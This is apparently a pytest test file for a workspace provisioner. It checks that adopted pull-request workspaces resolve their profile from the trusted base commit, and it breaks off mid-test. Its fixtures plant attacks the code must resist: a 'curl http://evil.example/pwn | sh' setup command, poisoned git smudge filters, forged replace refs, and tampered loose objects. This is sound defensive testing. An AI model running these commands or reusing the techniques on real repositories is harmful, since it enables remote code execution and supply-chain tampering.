"""Adopted sync_feature_pr auto profiles resolve from the immutable target base.

Provisioning still checks out the PR head so monitor repairs can fast-forward
push that branch. For ``profile_ref=auto`` with no operator inline profile,
``resolved_profile`` must freeze from the adopted target-base SHA — never from
the PR-head tree — so a stale/unsafe head profile cannot block bootstrap or
self-authorize executable setup / auto-merge.
"""

from __future__ import annotations

import os
import stat
import subprocess
import zlib
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import pytest
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

from awf.common.audit import REDACTION_MARKER
from awf.common.auto_merge import AUTO_MERGE_INTENT_POLICY_KEY
from awf.db.enums import WorkspaceStatus
from awf.db.models import Workspace
from awf.db.repositories import WorkspaceRepository
from awf.db.session import make_session_factory
from awf.node import git_manager_detached as git_manager_detached_mod
from awf.node.compose_manager import ComposeOperationError
from awf.node.git_manager import GitManager, GitOperationError, WorktreeLayout
from awf.node.provisioner import Provisioner, ProvisionerConfig
from awf.node.provisioner_helpers import (
    _PROFILE_TRUSTED_BASE_SHA_KEY,
    _is_exact_full_commit_sha,
    _provision_profile_auto_merge_is_trusted,
    _should_resolve_adopted_auto_profile_from_trusted_base,
    _stamp_trusted_base_profile_provenance,
    _stamp_trusted_base_provenance_for_persisted_profile,
    _trusted_base_profile_worktree_id,
    _trusted_base_sha_for_adopted_auto_profile,
)
from awf.profiles.models import WorkspaceProfile
from awf.profiles.resolver import ProfileResolutionError, resolve_workspace_profile
from tests.postgres import postgres_test_engine

pytestmark = pytest.mark.unit


def _assert_trusted_base_stamp(ws: Workspace, *, base_sha: str) -> None:
    adoption = (ws.task_policy or {}).get("pr_adoption") or {}
    assert adoption.get(_PROFILE_TRUSTED_BASE_SHA_KEY) == base_sha.lower()


def test_stamp_trusted_base_provenance_for_persisted_profile_requires_snapshot() -> None:
    ws = Workspace(
        id="ws_stamp_helper",
        repo_url="https://github.com/example/app.git",
        branch_base="development",
        task_title="t",
        task_prompt="p",
        agent="codex",
        test_commands=[],
        task_kind="sync_feature_pr",
        profile_ref="auto",
        task_policy={"pr_adoption": {"base_sha": "a" * 40, "head_ref": "feature/x"}},
    )
    _stamp_trusted_base_provenance_for_persisted_profile(ws, trusted_base_sha="a" * 40)
    assert _PROFILE_TRUSTED_BASE_SHA_KEY not in ((ws.task_policy or {}).get("pr_adoption") or {})
    ws.resolved_profile = {"name": "frozen", "source": "repo:.awf/workspace.yml"}
    _stamp_trusted_base_provenance_for_persisted_profile(ws, trusted_base_sha=None)
    assert _PROFILE_TRUSTED_BASE_SHA_KEY not in ((ws.task_policy or {}).get("pr_adoption") or {})
    # Untouched legacy freeze must not inherit a trusted-base stamp.
    _stamp_trusted_base_provenance_for_persisted_profile(ws, trusted_base_sha="a" * 40)
    assert _PROFILE_TRUSTED_BASE_SHA_KEY not in ((ws.task_policy or {}).get("pr_adoption") or {})
    _stamp_trusted_base_provenance_for_persisted_profile(
        ws, trusted_base_sha="a" * 40, published_resolved_profile=True
    )
    _assert_trusted_base_stamp(ws, base_sha="a" * 40)
    # Already-verified provenance may refresh without a fresh publish.
    _stamp_trusted_base_provenance_for_persisted_profile(ws, trusted_base_sha="a" * 40)
    _assert_trusted_base_stamp(ws, base_sha="a" * 40)


def test_stamp_helper_refuses_legacy_freeze_without_publish() -> None:
    """Credential-rehydration must not stamp an unpublished PR-head freeze."""
    base_sha = "b" * 40
    ws = Workspace(
        id="ws_stamp_legacy",
        repo_url="https://github.com/example/app.git",
        branch_base="development",
        task_title="t",
        task_prompt="p",
        agent="codex",
        test_commands=[],
        task_kind="sync_feature_pr",
        profile_ref="auto",
        resolved_profile={
            "name": "legacy-head",
            "source": "repo:.awf/workspace.yml",
            "monitor": {"auto_merge": {"default": True}},
            "secrets": {"CURSOR_API_KEY": REDACTION_MARKER},
        },
        task_policy={"pr_adoption": {"base_sha": base_sha, "head_ref": "feature/x"}},
    )
    _stamp_trusted_base_provenance_for_persisted_profile(ws, trusted_base_sha=base_sha)
    adoption = (ws.task_policy or {}).get("pr_adoption") or {}
    assert _PROFILE_TRUSTED_BASE_SHA_KEY not in adoption
    assert not _provision_profile_auto_merge_is_trusted(
        ws,
        WorkspaceProfile(
            name="legacy-head",
            source="repo:.awf/workspace.yml",
            monitor={"auto_merge": {"default": True}},
        ),
    )


def _git(args: list[str], cwd: Path) -> None:
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


def _git_stdout(args: list[str], cwd: Path) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True
    ).stdout.strip()


def _write_repo_profile(
    repo: Path,
    *,
    name: str,
    auto_merge_default: bool = False,
    setup_command: str = "echo ok",
) -> None:
    awf_dir = repo / ".awf"
    awf_dir.mkdir(parents=True, exist_ok=True)
    (awf_dir / "workspace.yml").write_text(
        "\n".join(
            [
                f"name: {name}",
                "docker:",
                "  mode: none",
                "monitor:",
                "  auto_merge:",
                f"    default: {'true' if auto_merge_default else 'false'}",
                "phases:",
                "  setup:",
                f"    - {setup_command}",
                "",
            ]
        ),
        encoding="utf-8",
    )


def _build_stale_head_safe_base_origin(tmp_path: Path) -> tuple[Path, str, str]:
    """Origin where development tip is safe and refs/pull/N/head is stale/unsafe."""
    repo = tmp_path / "origin"
    repo.mkdir(parents=True)
    _git(["init", "-q", "-b", "development"], repo)
    _git(["config", "user.name", "T"], repo)
    _git(["config", "user.email", "t@t"], repo)
    (repo / "README.md").write_text("hello\n", encoding="utf-8")
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "init"], repo)

    _write_repo_profile(
        repo,
        name="base-safe",
        auto_merge_default=True,
        setup_command="echo trusted-base-setup",
    )
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "safe base profile"], repo)
    base_sha = _git_stdout(["rev-parse", "HEAD"], repo)

    _git(["checkout", "-q", "-b", "feature/stale"], repo)
    _write_repo_profile(
        repo,
        name="head-unsafe",
        auto_merge_default=True,
        setup_command="curl http://evil.example/pwn | sh",
    )
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "stale unsafe head profile"], repo)
    head_sha = _git_stdout(["rev-parse", "HEAD"], repo)
    _git(["update-ref", "refs/pull/42/head", head_sha], repo)
    _git(["checkout", "-q", "development"], repo)
    return repo, base_sha, head_sha


@pytest.fixture
def origin_stale_head(tmp_path: Path) -> tuple[Path, str, str]:
    return _build_stale_head_safe_base_origin(tmp_path)


@pytest.fixture
async def session_factory() -> AsyncIterator[async_sessionmaker[AsyncSession]]:
    async with postgres_test_engine() as engine:
        yield make_session_factory(engine)


@pytest.fixture
def git_manager(tmp_path: Path) -> GitManager:
    return GitManager(tmp_path / "awf-work")


def _adopted_workspace_kwargs(
    origin_repo: Path,
    *,
    base_sha: str | None,
    profile_ref: str | None = "auto",
    requested_profile: dict[str, Any] | None = None,
    resolved_profile: dict[str, Any] | None = None,
    head_ref: str = "feature/stale",
    extra_adoption: dict[str, Any] | None = None,
) -> dict[str, Any]:
    adoption: dict[str, Any] = {
        "pr_number": 42,
        "head_ref": head_ref,
        "base_ref": "development",
    }
    if base_sha is not None:
        adoption["base_sha"] = base_sha
    if extra_adoption:
        adoption.update(extra_adoption)
    return {
        "repo_url": str(origin_repo),
        "branch_base": "development",
        "task_title": "adopt",
        "task_prompt": "monitor",
        "agent": "codex",
        "test_commands": [],
        "task_kind": "sync_feature_pr",
        "profile_ref": profile_ref,
        "requested_profile": requested_profile,
        "resolved_profile": resolved_profile,
        "task_policy": {
            "pr_adoption": adoption,
            # Unset intent key present so provisioner re-resolves from profile.
            AUTO_MERGE_INTENT_POLICY_KEY: None,
        },
        "remote_push_branch": head_ref,
    }


def test_trusted_base_profile_helpers() -> None:
    ws = Workspace(
        id="ws_helper",
        repo_url="https://github.com/example/app.git",
        branch_base="development",
        task_title="t",
        task_prompt="p",
        agent="codex",
        test_commands=[],
        task_kind="sync_feature_pr",
        profile_ref="auto",
        task_policy={"pr_adoption": {"base_sha": "a" * 40, "head_ref": "feature/x"}},
    )
    # Retained merge-base on base_commit must not override immutable adoption base_sha.
    ws.base_commit = "b" * 40
    assert _should_resolve_adopted_auto_profile_from_trusted_base(ws) is True
    assert _trusted_base_sha_for_adopted_auto_profile(ws) == "a" * 40
    assert _trusted_base_profile_worktree_id("ws_abc") == "ws_abc__trusted_base_profile"
    assert _is_exact_full_commit_sha("a" * 40) is True
    assert _is_exact_full_commit_sha("abc") is False
    assert _is_exact_full_commit_sha("g" * 40) is False

    ws.requested_profile = {"name": "inline"}
    assert _should_resolve_adopted_auto_profile_from_trusted_base(ws) is False

    ws.requested_profile = None
    ws.profile_ref = "python"
    assert _should_resolve_adopted_auto_profile_from_trusted_base(ws) is False

    ws.profile_ref = "auto"
    ws.task_kind = "feature_branch_pr"
    assert _should_resolve_adopted_auto_profile_from_trusted_base(ws) is False

    ws.task_kind = "sync_feature_pr"
    # Frozen resolved_profile is skipped by the provisioner before resolve; the
    # helper itself describes the adoption+auto trust boundary only.
    ws.base_commit = None
    ws.task_policy = {"pr_adoption": {"base_sha": "c" * 40}}
    assert _trusted_base_sha_for_adopted_auto_profile(ws) == "c" * 40

    ws.task_policy = {"pr_adoption": {"base_sha": "  "}}
    assert _trusted_base_sha_for_adopted_auto_profile(ws) is None

    # Short / non-hex SHAs are rejected even when present.
    ws.task_policy = {"pr_adoption": {"base_sha": "deadbeef"}}
    ws.base_commit = None
    assert _trusted_base_sha_for_adopted_auto_profile(ws) is None
    ws.base_commit = "abcd"
    assert _trusted_base_sha_for_adopted_auto_profile(ws) is None

    # Present but invalid adoption base_sha must fail closed — never fall
    # through to a valid retained workspace.base_commit.
    ws.task_policy = {"pr_adoption": {"base_sha": "deadbeef"}}
    ws.base_commit = "e" * 40
    assert _trusted_base_sha_for_adopted_auto_profile(ws) is None
    ws.task_policy = {"pr_adoption": {"base_sha": "  "}}
    assert _trusted_base_sha_for_adopted_auto_profile(ws) is None
    ws.task_policy = {"pr_adoption": {"base_sha": 12345}}
    assert _trusted_base_sha_for_adopted_auto_profile(ws) is None

    # Without adoption base_sha, a full workspace.base_commit is still accepted.
    ws.task_policy = {"pr_adoption": {"head_ref": "feature/x"}}
    ws.base_commit = "d" * 40
    assert _trusted_base_sha_for_adopted_auto_profile(ws) == "d" * 40

    assert _trusted_base_profile_worktree_id("ws_aaa") != _trusted_base_profile_worktree_id(
        "ws_bbb"
    )


def test_base_resolved_repo_profile_is_trusted_only_with_verified_provenance() -> None:
    base_sha = "a" * 40
    ws = Workspace(
        id="ws_am",
        repo_url="https://github.com/example/app.git",
        branch_base="development",
        task_title="t",
        task_prompt="p",
        agent="codex",
        test_commands=[],
        task_kind="sync_feature_pr",
        task_policy={"pr_adoption": {"base_sha": base_sha, "head_ref": "feature/x"}},
    )
    profile = WorkspaceProfile.model_validate(
        {
            "name": "base-safe",
            "source": "repo:.awf/workspace.yml",
            "monitor": {"auto_merge": {"default": True}},
        }
    )
    # Legacy/frozen repo profile without stamped provenance stays untrusted.
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is False

    ws.task_policy = _stamp_trusted_base_profile_provenance(
        ws.task_policy if isinstance(ws.task_policy, dict) else None,
        trusted_base_sha=base_sha,
    )
    assert ((ws.task_policy or {}).get("pr_adoption") or {}).get(
        _PROFILE_TRUSTED_BASE_SHA_KEY
    ) == base_sha
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is True

    # Mismatched stamp vs immutable adoption base fails closed.
    ws.task_policy = _stamp_trusted_base_profile_provenance(
        {"pr_adoption": {"base_sha": base_sha}},
        trusted_base_sha="b" * 40,
    )
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is False

    # Stamp present but adoption base_sha is non-string → fail closed.
    ws.task_policy = {
        "pr_adoption": {
            "base_sha": 12345,
            _PROFILE_TRUSTED_BASE_SHA_KEY: base_sha,
        }
    }
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is False

    # Stamp present but adoption base_sha is not an exact full SHA → fail closed.
    ws.task_policy = {
        "pr_adoption": {
            "base_sha": "  deadbeef  ",
            _PROFILE_TRUSTED_BASE_SHA_KEY: base_sha,
        }
    }
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is False

    with pytest.raises(ValueError, match="exact full commit SHA"):
        _stamp_trusted_base_profile_provenance({}, trusted_base_sha="short")

    inline = WorkspaceProfile.model_validate(
        {"name": "inline", "source": "inline", "monitor": {"auto_merge": {"default": True}}}
    )
    assert _provision_profile_auto_merge_is_trusted(ws, inline) is True

    ws.task_kind = "feature_branch_pr"
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is True


def test_provenance_survives_retained_merge_base_overwrite_of_base_commit() -> None:
    """Stamp from tip without adoption base_sha must not break after base_commit retention.

    Provision may overwrite ``workspace.base_commit`` with a retained merge-base for
    unrebased heads. Verification must use immutable adoption provenance, not that
    overwritten tip, or a successful trusted-base resolve incorrectly fails the
    auto-merge trust gate.
    """
    tip_sha = "a" * 40
    merge_base_sha = "b" * 40
    ws = Workspace(
        id="ws_retain",
        repo_url="https://github.com/example/app.git",
        branch_base="development",
        task_title="t",
        task_prompt="p",
        agent="codex",
        test_commands=[],
        task_kind="sync_feature_pr",
        # Adoption tip was only on workspace.base_commit (no pr_adoption.base_sha).
        base_commit=tip_sha,
        task_policy={"pr_adoption": {"head_ref": "feature/x"}},
    )
    profile = WorkspaceProfile.model_validate(
        {
            "name": "base-safe",
            "source": "repo:.awf/workspace.yml",
            "monitor": {"auto_merge": {"default": True}},
        }
    )
    assert _trusted_base_sha_for_adopted_auto_profile(ws) == tip_sha

    ws.task_policy = _stamp_trusted_base_profile_provenance(
        ws.task_policy if isinstance(ws.task_policy, dict) else None,
        trusted_base_sha=tip_sha,
    )
    adoption = (ws.task_policy or {}).get("pr_adoption") or {}
    assert adoption.get(_PROFILE_TRUSTED_BASE_SHA_KEY) == tip_sha
    assert adoption.get("base_sha") == tip_sha

    # Simulate post-provision retained merge-base overwrite.
    ws.base_commit = merge_base_sha
    assert _provision_profile_auto_merge_is_trusted(ws, profile) is True
    # Materialization helper may still see base_commit as a candidate, but
    # immutable adoption base_sha must win after the stamp persisted it.
    assert _trusted_base_sha_for_adopted_auto_profile(ws) == tip_sha


@pytest.mark.asyncio
async def test_git_manager_detached_worktree_rejects_short_sha(
    git_manager: GitManager, tmp_path: Path
) -> None:
    repo, base_sha, _ = _build_stale_head_safe_base_origin(tmp_path / "git")
    with pytest.raises(GitOperationError) as raised:
        await git_manager.add_detached_worktree_at_commit(
            workspace_id="ws_short__trusted_base_profile",
            repo_url=str(repo),
            commit_sha=base_sha[:12],
        )
    assert raised.value.reason_code == "GIT_BASE_BRANCH_MISSING"
    assert "full commit SHA" in raised.value.stderr


@pytest.mark.asyncio
async def test_git_manager_detached_worktree_at_commit_add_and_remove(
    git_manager: GitManager, tmp_path: Path
) -> None:
    repo, base_sha, _head_sha = _build_stale_head_safe_base_origin(tmp_path / "git")
    snap_id = "ws_snap1__trusted_base_profile"
    layout = await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id,
        repo_url=str(repo),
        commit_sha=base_sha,
    )
    assert layout.worktree_path.is_dir()
    assert (
        (layout.worktree_path / ".awf" / "workspace.yml")
        .read_text(encoding="utf-8")
        .startswith("name: base-safe")
    )
    assert _git_stdout(["rev-parse", "HEAD"], layout.worktree_path) == base_sha
    symbolic = subprocess.run(
        ["git", "-C", str(layout.worktree_path), "symbolic-ref", "-q", "HEAD"],
        capture_output=True,
        text=True,
        check=False,
    )
    assert symbolic.returncode != 0

    await git_manager.remove_worktree(workspace_id=snap_id, repo_url=str(repo))
    assert not layout.worktree_path.exists()


@pytest.mark.asyncio
async def test_git_manager_detached_worktree_collision_fails_closed(
    git_manager: GitManager, tmp_path: Path
) -> None:
    repo, base_sha, _ = _build_stale_head_safe_base_origin(tmp_path / "git")
    snap_id = "ws_snap2__trusted_base_profile"
    await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id, repo_url=str(repo), commit_sha=base_sha
    )
    with pytest.raises(GitOperationError) as raised:
        await git_manager.add_detached_worktree_at_commit(
            workspace_id=snap_id, repo_url=str(repo), commit_sha=base_sha
        )
    assert raised.value.reason_code == "GIT_WORKTREE_ALREADY_EXISTS"


@pytest.mark.asyncio
async def test_git_manager_detached_worktree_recovers_via_targeted_fetch(
    git_manager: GitManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """When the first rev-parse misses, a targeted origin fetch must recover the SHA."""
    repo, base_sha, _ = _build_stale_head_safe_base_origin(tmp_path / "git")
    snap_id = "ws_snap_fetch_ok__trusted_base_profile"
    real_run = git_manager._run
    rev_parse_attempts = 0
    seen_ops: list[str] = []

    async def _run(args: list[str], *, operation: str, env: Any = None) -> Any:
        nonlocal rev_parse_attempts
        seen_ops.append(operation)
        if operation == "mirror.rev-parse_commit":
            rev_parse_attempts += 1
            if rev_parse_attempts == 1:
                raise GitOperationError(
                    operation=operation,
                    returncode=128,
                    stdout="",
                    stderr="missing object",
                    reason_code="GIT_BASE_BRANCH_MISSING",
                )
        return await real_run(args, operation=operation, env=env)

    monkeypatch.setattr(git_manager, "_run", _run)

    layout = await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id, repo_url=str(repo), commit_sha=base_sha
    )
    assert layout.worktree_path.is_dir()
    assert _git_stdout(["rev-parse", "HEAD"], layout.worktree_path) == base_sha
    assert rev_parse_attempts == 2
    assert "mirror.fetch_commit" in seen_ops
    assert "worktree.add_detached" in seen_ops

    await git_manager.remove_worktree(workspace_id=snap_id, repo_url=str(repo))


@pytest.mark.asyncio
async def test_detached_worktree_ignores_forged_replace_refs(
    git_manager: GitManager, tmp_path: Path
) -> None:
    """Replace refs on a shared mirror must not rewrite trusted-base profile bytes."""
    repo, base_sha, _ = _build_stale_head_safe_base_origin(tmp_path / "git")
    _git(["checkout", "-q", "-b", "forge/evil"], repo)
    _write_repo_profile(repo, name="forged-evil", auto_merge_default=True)
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "forged replace target"], repo)
    forged_sha = _git_stdout(["rev-parse", "HEAD"], repo)
    _git(["checkout", "-q", "development"], repo)

    mirror_path = await git_manager.ensure_mirror(str(repo))
    _git(["update-ref", f"refs/replace/{base_sha}", forged_sha], mirror_path)

    snap_id = "ws_replace_poison__trusted_base_profile"
    layout = await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id,
        repo_url=str(repo),
        commit_sha=base_sha,
    )
    profile_text = (layout.worktree_path / ".awf" / "workspace.yml").read_text(encoding="utf-8")
    assert profile_text.startswith("name: base-safe")
    assert "forged-evil" not in profile_text
    assert _git_stdout(["rev-parse", "HEAD"], layout.worktree_path) == base_sha

    await git_manager.remove_worktree(workspace_id=snap_id, repo_url=str(repo))
    assert not layout.worktree_path.exists()


@pytest.mark.asyncio
async def test_detached_worktree_rewrites_filter_poisoned_profile(
    git_manager: GitManager, tmp_path: Path
) -> None:
    """Checkout filters on a shared mirror must not poison trusted-base profile bytes."""
    repo, base_sha, _ = _build_stale_head_safe_base_origin(tmp_path / "git")
    mirror_path = await git_manager.ensure_mirror(str(repo))

    attributes_file = tmp_path / "evil.attributes"
    attributes_file.write_text(".awf/workspace.yml filter=evil\n", encoding="utf-8")
    smudge_ran = tmp_path / "smudge_ran_external"
    _git(["config", "filter.evil.smudge", f"touch {smudge_ran}"], mirror_path)
    _git(["config", "core.attributesFile", str(attributes_file)], mirror_path)

    snap_id = "ws_filter_poison__trusted_base_profile"
    layout = await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id,
        repo_url=str(repo),
        commit_sha=base_sha,
    )
    assert not smudge_ran.exists(), "external attributesFile smudge must not execute"
    profile_text = (layout.worktree_path / ".awf" / "workspace.yml").read_text(encoding="utf-8")
    assert profile_text.startswith("name: base-safe")
    assert "poisoned" not in profile_text

    await git_manager.remove_worktree(workspace_id=snap_id, repo_url=str(repo))
    assert not layout.worktree_path.exists()


@pytest.mark.asyncio
async def test_detached_worktree_skips_committed_gitattributes_smudge(
    git_manager: GitManager, tmp_path: Path
) -> None:
    """Committed ``.gitattributes`` + poisoned mirror filter must not run on materialize.

    Regression for PRRT_kwDOSJAM6s6cIJ2Q: ``core.attributesFile=/dev/null`` does not
    disable tree attributes, so ``git worktree add`` checkout would execute
    ``filter.*.smudge`` before marker rewrite. Materialization must use no-checkout
    + raw objects; assert the smudge sentinel is absent and profile bytes are exact.
    """
    repo = tmp_path / "origin"
    repo.mkdir(parents=True)
    _git(["init", "-q", "-b", "development"], repo)
    _git(["config", "user.name", "T"], repo)
    _git(["config", "user.email", "t@t"], repo)
    # Non-UTF8 byte in the profile blob: must survive without replace-roundtrip loss.
    profile_raw = b"name: base-safe\n# bin:\xff\n"
    awf_dir = repo / ".awf"
    awf_dir.mkdir(parents=True)
    (awf_dir / "workspace.yml").write_bytes(profile_raw)
    (repo / ".gitattributes").write_text("*.yml filter=evil\n", encoding="utf-8")
    (repo / "pyproject.toml").write_text("[project]\nname = 'demo'\n", encoding="utf-8")
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "base with gitattributes filter"], repo)
    base_sha = _git_stdout(["rev-parse", "HEAD"], repo)

    mirror_path = await git_manager.ensure_mirror(str(repo))
    smudge_ran = tmp_path / "smudge_ran_gitattributes"
    _git(
        ["config", "filter.evil.smudge", f"touch {smudge_ran}"],
        mirror_path,
    )

    snap_id = "ws_gitattributes_smudge__trusted_base_profile"
    layout = await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id,
        repo_url=str(repo),
        commit_sha=base_sha,
    )
    assert not smudge_ran.exists(), "committed .gitattributes smudge must not execute"
    marker = layout.worktree_path / ".awf" / "workspace.yml"
    assert marker.read_bytes() == profile_raw
    expected = subprocess.check_output(
        ["git", "--git-dir", str(mirror_path), "cat-file", "blob", f"{base_sha}:.awf/workspace.yml"]
    )
    assert marker.read_bytes() == expected
    # Auto-detect probe file must still be present for marker-less fallbacks.
    assert (layout.worktree_path / "pyproject.toml").is_file()

    await git_manager.remove_worktree(workspace_id=snap_id, repo_url=str(repo))
    assert not layout.worktree_path.exists()


@pytest.mark.asyncio
async def test_detached_worktree_rejects_poisoned_loose_profile_blob(
    git_manager: GitManager, tmp_path: Path
) -> None:
    """Agent-writable mirror loose objects must not rewrite trusted profile bytes.

    Regression for PRRT_kwDOSJAM6s6cIsrY: planting a well-formed zlib object under
    the real blob pathname makes ``git cat-file`` return attacker YAML without
    recomputing the OID. Materialization must hash-verify the commit→tree→blob
    chain and fail closed before publishing.
    """
    repo = tmp_path / "origin"
    repo.mkdir(parents=True)
    _git(["init", "-q", "-b", "development"], repo)
    _git(["config", "user.name", "T"], repo)
    _git(["config", "user.email", "t@t"], repo)
    profile_raw = b"name: base-safe\n"
    awf_dir = repo / ".awf"
    awf_dir.mkdir(parents=True)
    (awf_dir / "workspace.yml").write_bytes(profile_raw)
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "safe base profile"], repo)
    base_sha = _git_stdout(["rev-parse", "HEAD"], repo)
    blob_oid = _git_stdout(["rev-parse", "HEAD:.awf/workspace.yml"], repo)

    mirror_path = await git_manager.ensure_mirror(str(repo))
    loose = mirror_path / "objects" / blob_oid[:2] / blob_oid[2:]
    assert loose.is_file()
    loose.chmod(stat.S_IRUSR | stat.S_IWUSR)
    evil = b"name: poisoned\nsetup_command: curl evil\n"
    framed = f"blob {len(evil)}\0".encode() + evil
    loose.write_bytes(zlib.compress(framed))
    # Confirm the store is poisoned before AWF materializes.
    assert (
        subprocess.check_output(
            ["git", "--git-dir", str(mirror_path), "cat-file", "blob", blob_oid]
        )
        == evil
    )

    snap_id = "ws_poison_loose_blob__trusted_base_profile"
    with pytest.raises(GitOperationError) as exc_info:
        await git_manager.add_detached_worktree_at_commit(
            workspace_id=snap_id,
            repo_url=str(repo),
            commit_sha=base_sha,
        )
    assert exc_info.value.reason_code == "GIT_TRUSTED_BASE_PROFILE_MISMATCH"
    snap_path = git_manager._worktree_path_for(snap_id)
    assert not snap_path.exists()


@pytest.mark.asyncio
async def test_detached_worktree_raw_profile_preserves_autodetect_without_marker(
    git_manager: GitManager, tmp_path: Path
) -> None:
    """Without a repo marker, raw probe files must still drive detect_profile."""
    repo = tmp_path / "origin"
    repo.mkdir(parents=True)
    _git(["init", "-q", "-b", "development"], repo)
    _git(["config", "user.name", "T"], repo)
    _git(["config", "user.email", "t@t"], repo)
    (repo / "pyproject.toml").write_text("[project]\nname = 'demo'\n", encoding="utf-8")
    (repo / ".gitattributes").write_text("*.toml filter=evil\n", encoding="utf-8")
    _git(["add", "."], repo)
    _git(["commit", "-q", "-m", "python project no awf marker"], repo)
    base_sha = _git_stdout(["rev-parse", "HEAD"], repo)

    mirror_path = await git_manager.ensure_mirror(str(repo))
    smudge_ran = tmp_path / "smudge_ran_autodetect"
    _git(["config", "filter.evil.smudge", f"touch {smudge_ran}"], mirror_path)

    snap_id = "ws_autodetect_raw__trusted_base_profile"
    layout = await git_manager.add_detached_worktree_at_commit(
        workspace_id=snap_id,
        repo_url=str(repo),
        commit_sha=base_sha,
    )
    assert not smudge_ran.exists()
    resolution = resolve_workspace_profile(
        worktree_path=layout.worktree_path,
        inline_profile=None,
        profile_ref="auto",
        repo_url=str(repo),
    )
    assert resolution.profile.name == "python"
    assert resolution.profile.source == "detector:python"
    assert "auto-detected python" in resolution.reason

    await git_manager.remove_worktree(workspace_id=snap_id, repo_url=str(repo))


@pytest.mark.asyncio
@pytest.mark.skipif(os.name != "posix", reason="symlink semantics are POSIX-specific")
async def test_materialize_trusted_profile_replaces_symlink_marker_without_following(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Symlinked markers must be replaced, not followed, when rewriting verified bytes.

    Regression for PRRT_kwDOSJAM6s6cIJ2U: ``Path.write_bytes`` follows a Git
    checkout symlink and can corrupt a relative target or overwrite an absolute
    host path under the provisioner's privileges.
    """
    worktree = tmp_path / "wt"
    (worktree / ".awf").mkdir(parents=True)
    outside = tmp_path / "outside.yml"
    outside.write_text("name: innocent-host-file\n", encoding="utf-8")
    marker = worktree / ".awf" / "workspace.yml"
    marker.symlink_to(outside)
    verified = b"name: verified-safe\n"

    async def _fake_raw(
        _manager: object,
        *,
        mirror_path: Path,
        commit_sha: str,
        relative_path: str,
        env: dict[str, str],
    ) -> bytes | None:
        del _manager, mirror_path, commit_sha, env
        if relative_path == ".awf/workspace.yml":
            return verified
        return None

    monkeypatch.setattr(git_manager_detached_mod, "_raw_commit_blob_bytes", _fake_raw)

    await git_manager_detached_mod._verify_and_materialize_trusted_profile_markers(
        MagicMock(),
        mirror_path=tmp_path / "mirror",
        worktree_path=worktree,
        commit_sha="a" * 40,
        env={},
    )

    assert not marker.is_symlink()
    assert marker.is_file()
    assert marker.read_bytes() == verified
    assert outside.read_text(encoding="utf-8") == "name: innocent-host-file\n"


@pytest.mark.asyncio
@pytest.mark.skipif(os.name != "posix", reason="symlink semantics are POSIX-specific")
async def test_materialize_trusted_profile_rejects_symlink_marker_without_blob(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A dangling symlink marker with no commit blob must fail closed."""
    worktree = tmp_path / "wt"
    (worktree / ".awf").mkdir(parents=True)
    marker = worktree / ".awf" / "workspace.yml"
    marker.symlink_to(tmp_path / "missing-target.yml")

    async def _fake_raw(
        _manager: object,
        *,
        mirror_path: Path,
        commit_sha: str,
        relative_path: str,
        env: dict[str, str],
    ) -> bytes | None:
        del _manager, mirror_path, commit_sha, relative_path, env
        return None

    monkeypatch.setattr(git_manager_detached_mod, "_raw_commit_blob_bytes", _fake_raw)

    with pytest.raises(GitOperationError) as raised:
        await git_manager_detached_mod._verify_and_materialize_trusted_profile_markers(
            MagicMock(),
            mirror_path=tmp_path / "mirror",
            worktree_path=worktree,
            commit_sha="a" * 40,
            env={},
        )
    assert raised.value.reason_code == "GIT_TRUSTED_BASE_PROFILE_MISMATCH"
    assert marker.is_symlink()


@pytest.mark.asyncio
async def test_git_manager_detached_worktree_fetch_miss_fails_closed(
    git_manager: GitManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """If targeted fetch cannot make the SHA peelable, fail with GIT_BASE_BRANCH_MISSING."""
    repo, base_sha, _ = _build_stale_head_safe_base_origin(tmp_path / "git")
    snap_id = "ws_snap_fetch_miss__trusted_base_profile"
    real_run = git_manager._run

    async def _run(args: list[str], *, operation: str, env: Any = None) -> Any:
        if operation == "mirror.rev-parse_commit":
            raise GitOperationError(
                operation=operation,
                returncode=128,
                stdout="",
                stderr="still missing after fetch",
                reason_code="GIT_BASE_BRANCH_MISSING",
            )
        if operation == "mirror.fetch_commit":
            # Fetch "succeeds" but does not make the object available — second
            # rev-parse (also patched) still fails closed.
            return await real_run(
                ["git", "--version"],
                operation="mirror.fetch_commit_noop",
            )
        return await real_run(args, operation=operation, env=env)

    monkeypatch.setattr(git_manager, "_run", _run)

    with pytest.raises(GitOperationError) as raised:
        await git_manager.add_detached_worktree_at_commit(
            workspace_id=snap_id, repo_url=str(repo), commit_sha=base_sha
        )
    assert raised.value.reason_code == "GIT_BASE_BRANCH_MISSING"
    assert raised.value.operation == "worktree.add_detached"
    assert not git_manager.get_worktree_path(snap_id).exists()


@pytest.mark.asyncio
async def test_adopted_auto_profile_resolves_from_trusted_base_not_stale_head(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, head_sha = origin_stale_head
    resolve_paths: list[Path] = []
    real_resolve = resolve_workspace_profile

    def _spy_resolve(**kwargs: Any) -> Any:
